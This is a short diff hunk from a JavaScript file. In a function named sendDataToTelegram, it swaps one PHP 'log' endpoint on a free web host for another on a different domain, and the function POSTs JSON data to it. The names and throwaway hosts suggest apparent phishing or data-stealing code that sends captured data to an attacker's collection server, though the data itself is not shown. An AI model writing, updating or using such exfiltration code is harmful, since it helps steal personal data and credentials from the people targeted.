@@ -66,7 +66,7 @@ async function sendDataToTelegram() {
     };
 
     try {
-        const response = await fetch('https://masterly-hoof.000webhostapp.com/logapi.php', {
+        const response = await fetch('http://api.mobikapi.run.place/sergey/logapu.php', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
